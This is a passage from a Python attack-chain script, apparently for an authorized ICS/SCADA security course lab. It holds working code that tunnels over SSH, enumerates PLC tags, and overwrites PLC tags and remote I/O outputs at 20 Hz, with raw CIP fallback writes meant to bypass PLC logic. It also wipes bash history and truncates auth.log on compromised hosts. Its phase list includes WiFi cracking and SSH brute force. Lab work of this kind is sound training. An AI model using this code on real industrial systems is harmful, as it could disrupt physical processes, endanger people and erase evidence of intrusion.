                    idx = int(raw_idx) - 1
                    if not (0 <= idx < len(display_tags)):
                        raise ValueError
                    selected_tag_obj = display_tags[idx]
                    tag   = _tname(selected_tag_obj)
                    dtype = _ttype(selected_tag_obj)
                except ValueError:
                    warn("Invalid selection — enter a number from the table or 'q' to quit")
                    continue

                CFG["plc"]["tag"] = tag
                is_bool = dtype.upper() == "BOOL"

                # ── INNER LOOP: continuous injection on same tag ──────────────
                while not quit_all:
                    with plc_lock:
                        cur_res = plc_conn.read(tag)
                    cur_val = cur_res.value if cur_res else "unknown"

                    console.print()
                    console.print(
                        f"[dim]  [bold]back[/bold] / [bold]b[/bold] = change tag  |  "
                        f"[bold]q[/bold] = quit[/dim]"
                    )

                    if is_bool:
                        prompt_hint = "[dim](BOOL — enter [bold]true[/bold]/[bold]false[/bold] or [bold]1[/bold]/[bold]0[/bold])[/dim]"
                    else:
                        prompt_hint = f"[dim](current: [bold yellow]{cur_val}[/bold yellow])[/dim]"

                    raw_val = Prompt.ask(
                        f"[red]  {tag}[/red] [{dtype}] "
                        f"{prompt_hint} "
                        f"[red]→ new value[/red]"
                    ).strip().lower()

                    if raw_val in ("q", "quit"):
                        _stop_stealth()
                        quit_all = True
                        break

                    if raw_val in ("b", "back"):
                        _stop_stealth()
                        break   # return to outer loop (re-prompts stealth mode)

                    inject_val = _cast(raw_val, cur_val, dtype)

                    with plc_lock:
                        before = plc_conn.read(tag)
                        plc_conn.write((tag, inject_val))
                        after  = plc_conn.read(tag)

                    info(f"  Before : {before.value}")
                    ok(f"  After  : [bold green]{after.value}[/bold green]")
                    payloads_fired.append(f"{tag}: {before.value} → {after.value}")

        finally:
            plc_conn.close()

        if payloads_fired:
            r.status  = "success"
            r.finding = "Payloads fired: " + " | ".join(payloads_fired)
            ok(r.finding)
        else:
            r.status  = "skipped"
            r.finding = "No payloads deployed"

        r.output = "\n".join(payloads_fired)

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    finally:
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)
            info(f"Removed {key_file}")

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(6, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip   = CFG["ids"]["ip"]
    ids_port = CFG["ids"]["port"]
    ids_user = CFG["ids"]["username"]
    ids_pass = CFG["ids"]["password"]
    ids_cmd  = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    info(f"Checking Suricata alerts on IDS ({ids_ip}) via Historian hop...")

    try:
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)
        ids_pkey    = CFG["ids"].get("private_key")   # set by Phase 4 if key was stolen
        ids_client  = ssh_hop(
            hist_client, ids_ip, ids_port, ids_user,
            target_pass=None if ids_pkey else ids_pass,
            pkey=ids_pkey,
        )

        stdout, _, _ = ssh_run(ids_client, ids_cmd)

        # ── Anti-forensics: wipe bash history + auth.log on remote hosts ─────
        for af_client in (ids_client, hist_client):
            try:
                ssh_run(af_client,
                        "cat /dev/null > ~/.bash_history; "
                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
                        timeout=5)
            except Exception:
                pass

        ids_client.close()
        hist_client.close()

        if stdout.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(stdout)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
            r.status  = "success"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"
            r.status  = "success"

        r.output = stdout

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


# ── Phase 5: CIP Enumerator ───────────────────────────────────────────────────

def phase5_cip_enum() -> PhaseResult:
    phase_header(5, "CIP Recon — PLC Memory Map")
    r = PhaseResult("CIP Enumerator")

    from pycomm3 import LogixDriver

    # ── Pull credentials from CFG (same pattern as phase5_plc_attack) ─────────
    plc_ip    = CFG["plc"]["ip"]

    hist_ip   = CFG["historian"]["ip"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip    = CFG["ids"]["ip"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_pkey  = CFG["ids"].get("private_key")

    LOCAL_PORT   = 44818
    CIP_SLOTS    = ["", "/0", "/1", "/2", "/3"]

    def _tname(t) -> str:
        return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
    def _ttype(t) -> str:
        dt = t.get("data_type", "Unknown") if isinstance(t, dict) else getattr(t, "data_type", "Unknown")
        if isinstance(dt, dict):
            return str(dt.get("name", "STRUCT"))
        return str(dt)
    def _is_noise(name: str) -> bool:
        return (
            name.startswith("__")
            or "Program:" in name
            or "Routine:" in name
            or "Task:"    in name
            or "Trend:"   in name
        )

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None
    plc_conn                               = None

    try:
        # ── Spawn ssh -L tunnel ───────────────────────────────────────────────
        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )

        info("Waiting 4 s for tunnel to stabilise...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"SSH tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        # ── Slot hunt ─────────────────────────────────────────────────────────
        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path: {path!r}")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                ok(f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                warn(f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(
                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel"
            )

        # ── Tag enumeration ───────────────────────────────────────────────────
        info("Pulling full tag list from PLC data table...")
        all_tags  = plc_conn.get_tag_list()
        user_tags = [t for t in all_tags if not _is_noise(_tname(t))]

        ok(
            f"{len(all_tags)} tags retrieved — "
            f"{len(all_tags) - len(user_tags)} system tags suppressed — "
            f"[bold]{len(user_tags)} user-defined tags remain[/bold]"
        )

        if not user_tags:
            r.status  = "failed"
            r.finding = "No user-defined tags found"
            err(r.finding)
            return r

        # ── Live reads ────────────────────────────────────────────────────────
        info("Reading live values from PLC...")
        tbl = Table(
            title="[bold magenta]Target Environment: PLC Memory Map[/bold magenta]",
            show_header=True, header_style="bold cyan",
            border_style="dim", show_lines=False, padding=(0, 1),
        )
        tbl.add_column("#",          style="dim",    width=5,  justify="right")
        tbl.add_column("Tag Name",   style="green",  width=42)
        tbl.add_column("Data Type",  style="yellow", width=14)
        tbl.add_column("Live Value", style="white",  width=22)

        reads_ok     = 0
        reads_denied = 0
        findings_log = []

        for i, tag in enumerate(user_tags, 1):
            name  = _tname(tag)
            dtype = _ttype(tag)
            try:
                result = plc_conn.read(name)
                if result is None or result.value is None:
                    value_str = "[dim]None[/dim]"
                else:
                    value_str = escape(str(result.value))
                    findings_log.append(f"{name} ({dtype}) = {result.value}")
                reads_ok += 1
            except Exception:
                value_str    = "[bold red]ACCESS DENIED[/bold red]"
                reads_denied += 1

            name_str  = str(escape(name))
            dtype_str = str(escape(dtype))
            tbl.add_row(str(i), name_str, dtype_str, value_str)

        console.print(tbl)
        console.print()
        console.print(Panel(
            f"[bold white]Tags read successfully :[/bold white] [green]{reads_ok}[/green]\n"
            f"[bold white]Access denied          :[/bold white] "
            + (f"[red]{reads_denied}[/red]" if reads_denied else "[dim]0[/dim]") +
            f"\n[bold white]Total user tags        :[/bold white] {len(user_tags)}",
            title="[bold cyan] Enumeration Summary [/bold cyan]",
            border_style="cyan", expand=False,
        ))

        r.status  = "success"
        r.finding = (
            f"{len(user_tags)} user tags enumerated — "
            f"{reads_ok} readable, {reads_denied} denied"
        )
        r.output  = "\n".join(findings_log)

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))
    finally:
        if plc_conn:
            try: plc_conn.close()
            except Exception: pass
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)
            info(f"Removed {key_file}")

    return r


# ── Phase 8: Direct Remote I/O Injector ──────────────────────────────────────

def phase8_direct_io_inject() -> PhaseResult:
    phase_header(8, "Direct Remote I/O Injection (Bypass PLC Logic)")
    r = PhaseResult("Direct I/O Inject")

    from pycomm3 import LogixDriver, CommError

    LOCAL_PORT = 44818

    # ── Known Point I/O output tag candidates (1734-OE2C / similar) ──────────
    OUTPUT_TAGS = [
        "RemoteIO:4:O.Data[0]",
        "RemoteIO:4:O.Ch0_Output",
        "RemoteIO:3:O.Data[0]",
        "RemoteIO:3:O.Ch0_Output",
        "O.Data[0]",
        "Ch0_Output",
    ]

    # ── Raw CIP generic message fallback parameters ────────────────────────────
    # Service 0x10 = Set_Attribute_Single, Class 0x04 = Assembly Object
    CIP_SERVICE   = 0x10
    CIP_CLASS     = 0x04
    CIP_INSTANCES = [100, 101, 102, 104]
    CIP_ATTRIBUTE = 3

    # ── Operator prompts — target IP and inject value ─────────────────────────
    console.print()
    adapter_ip = Prompt.ask(
        "[yellow]Remote I/O Adapter IP[/yellow]  "
        f"[dim](default: {CFG['plc']['ip']} — enter a different IP to target the I/O rack directly)[/dim]",
        default=CFG["plc"]["ip"],
    ).strip()

    console.print(Panel(
        f"[bold white]Adapter    :[/bold white] [bold yellow]{adapter_ip}[/bold yellow]  "
        f"(via tunnel 127.0.0.1:{LOCAL_PORT})\n"
        f"[bold white]Module     :[/bold white] 1734-OE2C / Point I/O output rack\n"
        f"[bold white]Strategy   :[/bold white] Tag write → raw CIP Assembly Object fallback\n"
        f"[bold white]Fire rate  :[/bold white] 50 ms  (20 Hz — outruns PLC scan cycle)\n"
        f"[dim]Press [bold]Ctrl-C[/bold] to stop the injection loop and exit cleanly.[/dim]",
        title="[bold red] Direct I/O Injector [/bold red]",
        border_style="red", expand=False,
    ))

    console.print()
    inject_raw = Prompt.ask(
        "[yellow]Value to inject (integer, e.g. 100)[/yellow]",
        default="100",
    ).strip()
    try:
        inject_value = int(inject_raw)
    except ValueError:
        r.status  = "failed"
        r.finding = f"Invalid inject value: {inject_raw!r}"
        err(r.finding)
        return r

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None

    try:
        # ── Ghost-process cleanup then open tunnel ────────────────────────────
        run_cmd("pkill -f 'ssh -W' 2>/dev/null || true",          capture=False)
        run_cmd("pkill -f 'ssh -N -L 44818' 2>/dev/null || true", capture=False)

        hist_ip   = CFG["historian"]["ip"]
        hist_user = CFG["historian"]["username"]
        hist_pass = CFG["historian"]["password"]
        ids_ip    = CFG["ids"]["ip"]
        ids_user  = CFG["ids"]["username"]
        ids_pass  = CFG["ids"]["password"]
        ids_pkey  = CFG["ids"].get("private_key")

        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {adapter_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            adapter_ip, LOCAL_PORT,
        )
        info("Waiting 4 s for tunnel to stabilise...")
        time.sleep(4)
        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"SSH tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {adapter_ip}")

        # ── Connect via slot hunt ─────────────────────────────────────────────
        CIP_SLOTS = ["", "/0", "/1", "/2", "/3"]
        plc_conn  = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path {path!r}...")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn = drv
                ok(f"Connected at {path!r}")
                break
            except Exception as e:
                warn(f"  {path!r} → {e}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError("All CIP slot paths failed — verify tunnel and PLC power")

        try:
            # ── Discover which output tag exists on this rack ─────────────────
            working_tag: str | None = None
            for candidate in OUTPUT_TAGS:
                info(f"Probing tag {candidate!r}...")
                result = plc_conn.read(candidate)
                if result is not None and result.error is None:
                    working_tag = candidate
                    ok(f"Output tag confirmed: [bold]{working_tag}[/bold]  "
                       f"(current value: {result.value})")
                    break
                warn(f"  {candidate!r} → not found or access denied")

            # ── Injection loop ────────────────────────────────────────────────
            shots = 0
            if working_tag:
                console.print(Panel(
                    f"[bold white]Tag        :[/bold white] [bold yellow]{working_tag}[/bold yellow]\n"
                    f"[bold white]Injecting  :[/bold white] [bold red]{inject_value}[/bold red]  "
                    f"every 50 ms\n"
                    f"[dim]Ctrl-C to stop[/dim]",
                    title="[bold red] ⚡ INJECTION ACTIVE [/bold red]",
                    border_style="red", expand=False,
                ))
                try:
                    while True:
                        res = plc_conn.write((working_tag, inject_value))
                        shots += 1
                        if shots % 20 == 0:   # status line every 1 s
                            ok(f"  {shots} writes fired → {working_tag} = {inject_value}")
                        time.sleep(0.05)
                except KeyboardInterrupt:
                    console.print("\n  [yellow][!] Injection stopped by operator[/yellow]")

            else:
                # ── Raw CIP Assembly Object fallback ─────────────────────────
                warn("No tag write succeeded — falling back to raw CIP Assembly Object writes")

                # Encode value as UINT (2 bytes, little-endian)
                raw_bytes = inject_value.to_bytes(2, byteorder="little", signed=False)

                working_instance: int | None = None
                for instance in CIP_INSTANCES:
                    info(f"Trying CIP generic: service=0x{CIP_SERVICE:02X} "
                         f"class=0x{CIP_CLASS:02X} instance={instance} attr={CIP_ATTRIBUTE}")
                    try:
                        resp = plc_conn.generic_message(
                            service=CIP_SERVICE,
                            class_code=CIP_CLASS,
                            instance=instance,
                            attribute=CIP_ATTRIBUTE,
                            request_data=raw_bytes,
                            connected=False,
                            unconnected_send=True,
                            route_path=True,
                        )
                        if resp and not resp.error:
                            working_instance = instance
                            ok(f"Raw CIP write accepted — instance {instance}")
                            break
                        warn(f"  instance {instance} → {resp.error if resp else 'no response'}")
                    except Exception as cip_err:
                        warn(f"  instance {instance} → {cip_err}")

                if working_instance is not None:
                    console.print(Panel(
                        f"[bold white]CIP Instance :[/bold white] {working_instance}\n"
                        f"[bold white]Injecting    :[/bold white] [bold red]{inject_value}[/bold red]  "
                        f"(0x{inject_value:04X})  every 50 ms\n"
                        f"[dim]Ctrl-C to stop[/dim]",
                        title="[bold red] ⚡ RAW CIP INJECTION ACTIVE [/bold red]",
                        border_style="red", expand=False,
                    ))
                    try:
                        while True:
                            plc_conn.generic_message(
                                service=CIP_SERVICE,
                                class_code=CIP_CLASS,
                                instance=working_instance,
                                attribute=CIP_ATTRIBUTE,
                                request_data=raw_bytes,
                                connected=False,
                                unconnected_send=True,
                                route_path=True,
                            )
                            shots += 1
                            if shots % 20 == 0:
                                ok(f"  {shots} raw CIP writes fired → instance {working_instance}")
                            time.sleep(0.05)
                    except KeyboardInterrupt:
                        console.print("\n  [yellow][!] Injection stopped by operator[/yellow]")
                else:
                    raise RuntimeError(
                        "All output tags and raw CIP instances failed — "
                        "verify rack addressing or try a different Instance ID"
                    )

            r.status  = "success"
            r.finding = f"{shots} writes fired  →  value={inject_value}"
            ok(r.finding)

        finally:
            try: plc_conn.close()
            except Exception: pass

    except KeyboardInterrupt:
        console.print("\n  [yellow][!] Phase interrupted by operator[/yellow]")
        r.status  = "skipped"
        r.finding = "Interrupted by operator"
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))
    finally:
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)

    return r


# ── Final report ──────────────────────────────────────────────────────────────

def print_report():
    now_str   = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    ts_slug   = datetime.now().strftime("%Y%m%d_%H%M%S")

    STATUS_ICON = {
        "success": ("green",  "✔  SUCCESS"),
        "failed":  ("red",    "✘  FAILED "),
        "skipped": ("yellow", "⊘  SKIPPED"),
        "pending": ("dim",    "●  PENDING"),
    }

    n_ok      = sum(1 for r in results if r.status == "success")
    n_fail    = sum(1 for r in results if r.status == "failed")
    n_skip    = sum(1 for r in results if r.status in ("skipped", "pending"))

    console.print()
    console.rule("[bold white]Attack Chain Report[/bold white]")
    console.print()

    # ── Header panel ──────────────────────────────────────────────────────────
    console.print(Panel(
        f"[bold white]Course     :[/bold white]  INCS 4810 — ICS/SCADA Security\n"
        f"[bold white]Instructor :[/bold white]  Victor Mendez\n"
        f"[bold white]Scope      :[/bold white]  Isolated BCIT Lab  (SW01-3550)  —  Authorized\n"
        f"[bold white]Timestamp  :[/bold white]  {now_str}",
        title="[bold cyan] Engagement Summary [/bold cyan]",
        border_style="cyan", expand=False,
    ))
    console.print()

    # ── Score bar ─────────────────────────────────────────────────────────────
    score_line = (
        f"[bold green]✔  {n_ok} succeeded[/bold green]   "
        f"[bold red]✘  {n_fail} failed[/bold red]   "
        f"[bold yellow]⊘  {n_skip} skipped[/bold yellow]"
    )
    console.print(Panel(score_line, border_style="dim", expand=False))
    console.print()

    # ── Phase detail table ────────────────────────────────────────────────────
    table = Table(
        show_header=True, header_style="bold magenta",
        border_style="dim", show_lines=True,
    )
    table.add_column("#",         style="dim",    width=3,  justify="right")
    table.add_column("Phase",     style="cyan",   width=28)
    table.add_column("Status",    width=14)
    table.add_column("Timestamp", style="dim",    width=22)
    table.add_column("Finding",   width=48)

    for i, r in enumerate(results, 1):
        color, icon = STATUS_ICON.get(r.status, ("white", r.status.upper()))
        ts_display  = r.ts[:19].replace("T", "  ") if r.ts else "—"
        table.add_row(
            str(i),
            r.phase,
            f"[bold {color}]{icon}[/bold {color}]",
            ts_display,
            escape(r.finding),
        )

    console.print(table)
    console.print()

    # ── Key findings ──────────────────────────────────────────────────────────
    notable = [r for r in results if r.status in ("success", "failed") and r.finding]
    if notable:
        console.rule("[bold white]Key Findings[/bold white]")
        console.print()
        for r in notable:
            color, icon = STATUS_ICON.get(r.status, ("white", "●"))
            console.print(
                f"  [bold {color}]{icon}[/bold {color}]  "
                f"[bold]{escape(r.phase)}[/bold]\n"
                f"         [dim]{escape(r.finding)}[/dim]"
            )
        console.print()

    # ── Risk verdict ──────────────────────────────────────────────────────────
    if n_fail == 0 and n_ok > 0:
        verdict_color  = "red"
        verdict_icon   = "🔴"
        verdict_label  = "CRITICAL"
        verdict_detail = "All phases completed successfully — full attack chain confirmed."
    elif n_ok > 0:
        verdict_color  = "yellow"
        verdict_icon   = "🟡"
        verdict_label  = "ELEVATED"
        verdict_detail = f"{n_ok} phase(s) succeeded — partial chain execution confirmed."
    else:
        verdict_color  = "green"
        verdict_icon   = "🟢"
        verdict_label  = "CONTAINED"
        verdict_detail = "No phases succeeded — defenses appear effective."

    console.print(Panel(
        f"[bold {verdict_color}]{verdict_icon}  {verdict_label}[/bold {verdict_color}]\n"
        f"[dim]{verdict_detail}[/dim]",
        title="[bold white] Risk Verdict [/bold white]",
        border_style=verdict_color, expand=False,
    ))
    console.print()

    # ── Save HTML report ──────────────────────────────────────────────────────
    report_path = f"/tmp/incs4810_report_{ts_slug}.html"

    rows_html = ""
    for i, r in enumerate(results, 1):
        _, icon = STATUS_ICON.get(r.status, ("white", r.status))
        bg = {"success": "#1a3a1a", "failed": "#3a1a1a",
              "skipped": "#2a2a10", "pending": "#1a1a1a"}.get(r.status, "#1a1a1a")
        ts_display = r.ts[:19].replace("T", " ") if r.ts else "—"
        rows_html += (
            f"<tr style='background:{bg}'>"
            f"<td>{i}</td><td>{r.phase}</td>"
            f"<td>{icon.strip()}</td>"
            f"<td style='font-size:0.85em;color:#aaa'>{ts_display}</td>"
            f"<td>{escape(r.finding)}</td>"
            f"</tr>\n"
        )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>INCS 4810 — Red Team Report  {ts_slug}</title>
<style>
  body  {{ font-family: 'Courier New', monospace; background:#0d0d0d; color:#e0e0e0; margin:2rem; }}
  h1    {{ color:#ff4444; }}
  table {{ border-collapse:collapse; width:100%; margin-top:1rem; }}
  th    {{ background:#1e1e1e; color:#00cfff; padding:8px 12px; text-align:left; border-bottom:2px solid #333; }}
  td    {{ padding:7px 12px; border-bottom:1px solid #222; vertical-align:top; }}
  .meta {{ background:#111; border:1px solid #333; padding:1rem; border-radius:6px; margin-bottom:1rem; }}
  .score {{ margin:1rem 0; font-size:1.1em; }}
  .verdict {{ border:2px solid; border-radius:6px; padding:1rem; margin-top:1.5rem; }}
  .CRITICAL {{ border-color:#ff4444; background:#1a0000; }}
  .ELEVATED {{ border-color:#ffaa00; background:#1a1000; }}
  .CONTAINED {{ border-color:#44ff44; background:#001a00; }}
</style>
</head>
<body>
<h1>INCS 4810 — ICS/SCADA Red Team Report</h1>
<div class="meta">
  <b>Course:</b> INCS 4810 — ICS/SCADA Security<br>
  <b>Instructor:</b> Victor Mendez<br>
  <b>Scope:</b> Isolated BCIT Lab (SW01-3550) — Authorized<br>
  <b>Generated:</b> {now_str}
</div>
<div class="score">
  <span style="color:#44ff44">✔ {n_ok} succeeded</span> &nbsp;&nbsp;
  <span style="color:#ff4444">✘ {n_fail} failed</span> &nbsp;&nbsp;
  <span style="color:#ffaa00">⊘ {n_skip} skipped</span>
</div>
<table>
  <tr><th>#</th><th>Phase</th><th>Status</th><th>Timestamp</th><th>Finding</th></tr>
  {rows_html}
</table>
<div class="verdict {verdict_label}">
  <b>{verdict_icon} {verdict_label}</b><br>
  <span style="color:#aaa">{verdict_detail}</span>
</div>
</body>
</html>"""

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)

    ok(f"HTML report saved → [bold]{report_path}[/bold]  (open in browser for full view)")


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",              phase1_wifi_crack),
    (2, "IDMZ Recon",                 phase2_idmz_recon),
    (3, "SSH Brute Force",            phase3_ssh_bruteforce),
    (4, "SSH Pivot / OT Recon",       phase4_ssh_pivot),
    (5, "CIP Recon — PLC Map",        phase5_cip_enum),
    (6, "PLC CIP Write Attack",       phase5_plc_attack),
    (7, "Defense Validation",         phase6_defense_check),
]


def _phase_plan_panel():
    """Print the full phase plan before anything runs."""
    tbl = Table(
        show_header=True, header_style="bold cyan",
        border_style="dim", show_lines=False, padding=(0, 1),
    )
    tbl.add_column("#",       style="dim",   width=3,  justify="right")
    tbl.add_column("Phase",   style="green", width=28)
    tbl.add_column("What",    style="white", width=56)
    tbl.add_column("Est.",    style="cyan",  width=9)
    for n, title, _ in PHASES:
        _, desc, est = PHASE_META.get(n, (title, "—", "—"))
        tbl.add_row(str(n), title, desc, est)
    console.print(Panel(
        tbl,
        title="[bold cyan] Attack Chain — Phase Plan [/bold cyan]",
        border_style="cyan", expand=False,
    ))


def _phase_status_card(n: int, title: str, status: str, finding: str, elapsed: float):
    """Print a compact result card after each phase completes."""
    COLOR = {"success": "green", "failed": "red", "skipped": "yellow"}
    ICON  = {"success": "✔", "failed": "✘", "skipped": "⊘"}
    c = COLOR.get(status, "white")
    i = ICON.get(status, "●")
    console.print(Panel(
        f"[bold {c}]{i}  {status.upper()}[/bold {c}]   "
        f"[dim]elapsed [bold]{elapsed:.1f}s[/bold][/dim]\n"
        f"[dim]{escape(finding) if finding else '—'}[/dim]",
        title=f"[bold {c}] Phase {n}: {title} [/bold {c}]",
        border_style=c, expand=False,
    ))


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    # Build --phases help text with names
    phase_help = "Run specific phases only. Numbers and names:\n" + "\n".join(
        f"  {n}  {title}" for n, title, _ in PHASES
    )

    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        metavar="N",
        help=phase_help,
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts",
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Walk through all phase prompts but skip actual execution",
    )
    parser.add_argument(
        "--skip-failed", action="store_true",
        help="Auto-continue past failed phases without prompting",
    )
    args = parser.parse_args()

    banner()
    _phase_plan_panel()
    preflight_check()

    selected    = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
    chain_start = time.monotonic()

    for n, title, fn in PHASES:
        if n not in selected:
            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
            continue

        if not args.auto and not confirm_phase(n, title):
            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
            continue

        if args.dry_run:
            r = PhaseResult(title, status="skipped", finding="Dry run — execution skipped")
            results.append(r)
            _phase_status_card(n, title, r.status, r.finding, 0.0)
            continue

        while True:
            phase_start = time.monotonic()
            r = fn()
            phase_elapsed = time.monotonic() - phase_start

            _phase_status_card(n, title, r.status, r.finding, phase_elapsed)

            if r.status != "failed" or args.auto or args.skip_failed:
                break

            # ── Failure prompt — show options FIRST, then ask ─────────────────
            console.print()
            console.print(Panel(
                "  [bold]r[/bold]  →  Retry this phase\n"
                "  [bold]c[/bold]  →  Continue to next phase\n"
                "  [bold]q[/bold]  →  Quit and generate report",
                title="[bold red] ✘  Phase Failed — Choose Action [/bold red]",
                border_style="red", expand=False,
            ))
            choice = Prompt.ask(
                "[red]Action[/red]",
                choices=["r", "c", "q"],
                default="c",
            )

            if choice == "r":
                warn(f"Retrying Phase {n}: {title} ...")
                continue
            elif choice == "q":
                results.append(r)
                console.print("[bold red]Aborted by operator.[/bold red]")
                break
            else:
                break

        results.append(r)

    chain_elapsed = time.monotonic() - chain_start
    console.print()
    console.print(Panel(
        f"[bold white]Total elapsed :[/bold white]  [bold cyan]{chain_elapsed:.1f}s[/bold cyan]   "
        f"({chain_elapsed/60:.1f} min)\n"
        f"[bold white]Phases run    :[/bold white]  "
        f"[green]{sum(1 for r in results if r.status == 'success')} ok[/green]  "
        f"[red]{sum(1 for r in results if r.status == 'failed')} failed[/red]  "
        f"[yellow]{sum(1 for r in results if r.status in ('skipped','pending'))} skipped[/yellow]",
        title="[bold cyan] Chain Complete [/bold cyan]",
        border_style="cyan", expand=False,
    ))
    print_report()


if __name__ == "__main__":
    main()
